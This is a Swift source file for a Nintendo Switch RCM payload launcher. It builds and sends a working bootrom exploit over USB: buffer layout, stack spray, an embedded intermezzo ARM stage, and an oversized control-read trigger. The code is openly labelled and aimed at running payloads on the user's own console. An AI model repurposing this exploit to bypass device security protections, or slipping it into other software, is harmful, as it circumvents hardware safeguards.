import Foundation

public enum RCMPayloadError: LocalizedError, Equatable {
    case noPayload
    case deviceNotFound
    case badDeviceID
    case payloadTooLarge(bytesOver: Int)
    case exploitDidNotTrigger
    case deviceStillInRCM

    public var errorDescription: String? {
        switch self {
        case .noPayload:
            "Choose a payload .bin file first."
        case .deviceNotFound:
            "No Switch in RCM mode was found. Put the device into RCM, then connect USB."
        case .badDeviceID:
            "The RCM device returned an invalid device ID."
        case let .payloadTooLarge(bytesOver):
            "The payload is too large for RCM by \(bytesOver) byte\(bytesOver == 1 ? "" : "s")."
        case .exploitDidNotTrigger:
            "The RCM trigger unexpectedly returned successfully, so the payload probably did not launch."
        case .deviceStillInRCM:
            "The payload was uploaded, but the Switch stayed in RCM mode after the launch trigger."
        }
    }
}

public final class RCMPayloadLauncher {
    private static let fallbackInEndpoint: UInt8 = 0x81
    private static let fallbackOutEndpoint: UInt8 = 0x01
    private static let chunkSize = 0x1000
    private static let rcmPayloadAddress: UInt32 = 0x4001_0000
    private static let payloadStartAddress: UInt32 = 0x4001_0E40
    private static let stackSprayStart: UInt32 = 0x4001_4E40
    private static let stackSprayEnd: UInt32 = 0x4001_7000
    private static let maxPayloadLength = 0x30298
    private static let copyBufferAddresses = [0x4000_5000, 0x4000_9000]
    private static let stackEnd = 0x4001_0000

    private var currentBuffer = 0

    public init() {}

    public static var isRCMDeviceConnected: Bool {
        USBDeviceConnection.rcmDeviceExists()
    }

    public func launch(
        payloadURL: URL,
        onEvent: @escaping @Sendable (USBInstallEvent) -> Void
    ) throws {
        guard payloadURL.pathExtension.lowercased() == "bin" else {
            throw RCMPayloadError.noPayload
        }

        let payloadData = try Data(contentsOf: payloadURL)
        emit("Looking for a Switch in RCM mode.", .info, onEvent)

        let connection = USBDeviceConnection()
        try connection.openRCMDevice()
        defer {
            connection.close()
        }

        let endpoints = connection.bulkEndpoints() ?? USBBulkEndpoints(
            inEndpoint: Self.fallbackInEndpoint,
            outEndpoint: Self.fallbackOutEndpoint
        )
        emit(
            "RCM endpoints: IN \(Self.hex(endpoints.inEndpoint)), OUT \(Self.hex(endpoints.outEndpoint)).",
            .info,
            onEvent
        )

        let deviceID = try readDeviceID(connection: connection, endpoint: endpoints.inEndpoint)
        emit("RCM device connected: \(deviceID.map { String(format: "%02x", $0) }.joined()).", .success, onEvent)
        onEvent(.progress(0.1))

        let exploitPayload = try Self.exploitPayload(for: payloadData)
        emit(
            "Prepared \(payloadURL.lastPathComponent) for RCM: \(exploitPayload.count) bytes, \(exploitPayload.count / Self.chunkSize) chunks.",
            .success,
            onEvent
        )
        onEvent(.progress(0.4))

        try write(exploitPayload, connection: connection, endpoint: endpoints.outEndpoint) { progress in
            onEvent(.progress(0.4 + progress * 0.35))
        }

        emit("Payload uploaded. Switching buffers.", .info, onEvent)
        try switchToHighBuffer(connection: connection, endpoint: endpoints.outEndpoint)
        onEvent(.progress(0.8))

        emit("Triggering RCM launch.", .info, onEvent)
        try triggerVulnerability(connection: connection, onEvent: onEvent)
        Thread.sleep(forTimeInterval: 0.75)
        guard !Self.isRCMDeviceConnected else {
            throw RCMPayloadError.deviceStillInRCM
        }
        onEvent(.progress(1))
        emit("RCM payload launched.", .success, onEvent)
        onEvent(.completed)
    }

    static func exploitPayload(for payloadData: Data, intermezzo: [UInt8] = intermezzo) throws -> Data {
        let payloadBytes = [UInt8](payloadData)
        var exploit = [UInt8]()

        exploit += UInt32(maxPayloadLength).littleEndianBytes
        exploit += [UInt8](repeating: 0, count: 680 - exploit.count)
        exploit += intermezzo

        let payloadStartOffset = Int(payloadStartAddress - rcmPayloadAddress)
        let paddingToPayloadStart = payloadStartOffset - exploit.count
        guard paddingToPayloadStart >= 0 else {
            throw RCMPayloadError.payloadTooLarge(bytesOver: abs(paddingToPayloadStart))
        }
        exploit += [UInt8](repeating: 0, count: paddingToPayloadStart)

        let firstChunkSize = Int(stackSprayStart - payloadStartAddress)
        exploit += payloadBytes.prefix(firstChunkSize)

        let sprayValue = rcmPayloadAddress.littleEndianBytes
        for _ in 0..<(Int(stackSprayEnd - stackSprayStart) / MemoryLayout<UInt32>.size) {
            exploit += sprayValue
        }

        if payloadBytes.count > firstChunkSize {
            exploit += payloadBytes.dropFirst(firstChunkSize)
        }

        let remainder = exploit.count % chunkSize
        if remainder != 0 {
            exploit += [UInt8](repeating: 0, count: chunkSize - remainder)
        }

        guard exploit.count <= maxPayloadLength else {
            throw RCMPayloadError.payloadTooLarge(bytesOver: exploit.count - maxPayloadLength)
        }

        return Data(exploit)
    }

    private func readDeviceID(connection: USBDeviceConnection, endpoint: UInt8) throws -> [UInt8] {
        let data = try connection.bulkRead(endpoint: endpoint, maxLength: 16, timeout: 1_000)
        let deviceID = [UInt8](data)
        guard !deviceID.isEmpty, !deviceID.allSatisfy({ $0 == 0 }) else {
            throw RCMPayloadError.badDeviceID
        }
        return deviceID
    }

    private func write(
        _ data: Data,
        connection: USBDeviceConnection,
        endpoint: UInt8,
        onProgress: (Double) -> Void
    ) throws {
        var offset = 0
        while offset < data.count {
            let end = min(offset + Self.chunkSize, data.count)
            try writeSingleBuffer(Data(data[offset..<end]), connection: connection, endpoint: endpoint)
            offset = end
            onProgress(Double(offset) / Double(data.count))
        }
    }

    private func writeSingleBuffer(_ data: Data, connection: USBDeviceConnection, endpoint: UInt8) throws {
        toggleBuffer()
        try connection.bulkWrite(endpoint: endpoint, data: data, timeout: 1_000)
    }

    private func toggleBuffer() {
        currentBuffer = 1 - currentBuffer
    }

    private var currentBufferAddress: Int {
        Self.copyBufferAddresses[currentBuffer]
    }

    private func switchToHighBuffer(connection: USBDeviceConnection, endpoint: UInt8) throws {
        guard currentBufferAddress != Self.copyBufferAddresses[1] else { return }
        try write(Data(repeating: 0, count: Self.chunkSize), connection: connection, endpoint: endpoint) { _ in }
    }

    private func triggerVulnerability(
        connection: USBDeviceConnection,
        onEvent: @escaping @Sendable (USBInstallEvent) -> Void
    ) throws {
        let length = Self.stackEnd - currentBufferAddress
        emit("RCM trigger length: \(Self.hex(length)).", .info, onEvent)
        do {
            _ = try connection.controlRead(
                requestType: 0x82,
                request: 0x00,
                value: 0,
                index: 0,
                length: length,
                timeout: 1_000
            )
        } catch {
            return
        }

        throw RCMPayloadError.exploitDidNotTrigger
    }

    private static func hex(_ value: Int) -> String {
        "0x" + String(value, radix: 16, uppercase: true)
    }

    private static func hex(_ value: UInt8) -> String {
        "0x" + String(value, radix: 16, uppercase: true)
    }

    private func emit(
        _ message: String,
        _ level: TransferLogLevel,
        _ onEvent: @escaping @Sendable (USBInstallEvent) -> Void
    ) {
        onEvent(.log(TransferLogEntry(level: level, message: message)))
    }
}

private extension UInt32 {
    var littleEndianBytes: [UInt8] {
        withUnsafeBytes(of: littleEndian, Array.init)
    }
}

private extension RCMPayloadLauncher {
    // Intermezzo stage from CrystalRCM/fusee-launcher, embedded to avoid app-bundle resource lookup failures.
    static let intermezzo: [UInt8] = [
        0x5c, 0x00, 0x9f, 0xe5, 0x5c, 0x10, 0x9f, 0xe5, 0x5c, 0x20, 0x9f, 0xe5,
        0x01, 0x20, 0x42, 0xe0, 0x0e, 0x00, 0x00, 0xeb, 0x48, 0x00, 0x9f, 0xe5,
        0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1, 0x48, 0x00, 0x9f, 0xe5,
        0x48, 0x10, 0x9f, 0xe5, 0x01, 0x29, 0xa0, 0xe3, 0x07, 0x00, 0x00, 0xeb,
        0x38, 0x00, 0x9f, 0xe5, 0x01, 0x19, 0xa0, 0xe3, 0x01, 0x00, 0x80, 0xe0,
        0x34, 0x10, 0x9f, 0xe5, 0x03, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb,
        0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x04, 0x30, 0x91, 0xe4,
        0x04, 0x30, 0x80, 0xe4, 0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a,
        0x1e, 0xff, 0x2f, 0xe1, 0x00, 0xf0, 0x00, 0x40, 0x20, 0x00, 0x01, 0x40,
        0x7c, 0x00, 0x01, 0x40, 0x00, 0x00, 0x01, 0x40, 0x40, 0x0e, 0x01, 0x40,
        0x00, 0x70, 0x01, 0x40
    ]
}
